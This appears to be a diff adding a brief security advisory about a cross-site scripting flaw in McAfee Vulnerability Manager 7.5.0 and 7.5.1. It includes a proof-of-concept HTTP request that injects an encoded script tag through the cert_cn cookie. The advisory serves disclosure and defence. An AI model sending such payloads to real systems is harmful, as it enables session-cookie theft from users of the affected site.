@@ -1,0 +1,17 @@
+source: http://www.securityfocus.com/bid/58401/info
+
+McAfee Vulnerability Manager is prone to a cross-site scripting vulnerability.
+
+An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.
+
+McAfee Vulnerability Manager 7.5.0 and 7.5.1 are vulnerable; other versions may also be affected. 
+
+GET /www.example.com/index.exp HTTP/1.1
+Cookie: identity=p805oa53c0dab5vpcv1da30me7;
+cert_cn=%27%22%28%29%26%251%3CScRiPt %3Eprompt%28920847%29%3C%2FScRiPt%3E;
+remember=remember
+Host: 172.28.1.1
+Connection: Keep-alive
+Accept-Encoding: gzip,deflate
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)
+Accept: */* 
